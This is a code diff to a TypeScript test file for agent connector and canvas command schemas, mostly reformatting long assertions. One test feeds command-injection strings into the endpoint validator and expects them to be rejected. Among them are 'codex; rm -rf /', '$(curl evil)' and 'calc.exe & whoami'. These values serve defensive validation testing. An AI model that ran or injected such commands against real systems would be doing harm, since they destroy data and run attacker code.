@@ -30,22 +30,40 @@ describe("agent connector contracts", () => {
     expect(agentConnectorUpdateRequestSchema.safeParse({}).success).toBe(false);
     expect(agentConnectorUpdateRequestSchema.safeParse({ enabled: true }).success).toBe(true);
     expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: null }).success).toBe(true);
-    expect(agentConnectorUpdateRequestSchema.safeParse({ enabled: true, endpoint: "127.0.0.1:9876" }).success).toBe(true);
+    expect(
+      agentConnectorUpdateRequestSchema.safeParse({ enabled: true, endpoint: "127.0.0.1:9876" })
+        .success,
+    ).toBe(true);
     expect(agentConnectorUpdateRequestSchema.safeParse({ enabled: "yes" }).success).toBe(false);
   });
 
   it("rejects shell metacharacters in connector endpoints", () => {
     // 这些串会直达运行时的 spawn(shell) / net.connect。
-    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "calc.exe & whoami" }).success).toBe(false);
-    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "codex; rm -rf /" }).success).toBe(false);
-    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "$(curl evil)" }).success).toBe(false);
+    expect(
+      agentConnectorUpdateRequestSchema.safeParse({ endpoint: "calc.exe & whoami" }).success,
+    ).toBe(false);
+    expect(
+      agentConnectorUpdateRequestSchema.safeParse({ endpoint: "codex; rm -rf /" }).success,
+    ).toBe(false);
+    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "$(curl evil)" }).success).toBe(
+      false,
+    );
     expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "a`id`" }).success).toBe(false);
     // 普通命令名、带空格的 Windows 路径、私有网段的 host:port 仍放行。
     expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "codex" }).success).toBe(true);
-    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "C:\\Program Files\\codex.cmd" }).success).toBe(true);
-    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "192.168.1.50:8765" }).success).toBe(true);
-    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "[::1]:6379" }).success).toBe(true);
-    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "blender.local:8765" }).success).toBe(true);
+    expect(
+      agentConnectorUpdateRequestSchema.safeParse({ endpoint: "C:\\Program Files\\codex.cmd" })
+        .success,
+    ).toBe(true);
+    expect(
+      agentConnectorUpdateRequestSchema.safeParse({ endpoint: "192.168.1.50:8765" }).success,
+    ).toBe(true);
+    expect(agentConnectorUpdateRequestSchema.safeParse({ endpoint: "[::1]:6379" }).success).toBe(
+      true,
+    );
+    expect(
+      agentConnectorUpdateRequestSchema.safeParse({ endpoint: "blender.local:8765" }).success,
+    ).toBe(true);
   });
 
   it("blocks link-local and metadata targets in connector endpoints", () => {
@@ -91,7 +109,11 @@ describe("agent connector contracts", () => {
     expect(canvasControlCommandSchema.safeParse(command()).success).toBe(true);
     expect(canvasControlCommandSchema.safeParse(command({ actions: [] })).success).toBe(false);
     expect(canvasControlCommandSchema.safeParse(command({ source: "maya" })).success).toBe(false);
-    expect(canvasControlCommandSchema.safeParse(command({ actions: [{ type: "canvas_delete_node", nodeId: "n1" }] })).success).toBe(false);
+    expect(
+      canvasControlCommandSchema.safeParse(
+        command({ actions: [{ type: "canvas_delete_node", nodeId: "n1" }] }),
+      ).success,
+    ).toBe(false);
   });
 
   it("defaults receipt details and rejects unknown outcomes", () => {
@@ -101,10 +123,12 @@ describe("agent connector contracts", () => {
       appliedActions: 1,
     });
     expect(parsed).toMatchObject({ skippedActions: [], reason: null });
-    expect(canvasControlReceiptRequestSchema.safeParse({
-      commandId: COMMAND_ID,
-      status: "maybe",
-      appliedActions: 1,
-    }).success).toBe(false);
+    expect(
+      canvasControlReceiptRequestSchema.safeParse({
+        commandId: COMMAND_ID,
+        status: "maybe",
+        appliedActions: 1,
+      }).success,
+    ).toBe(false);
   });
 });
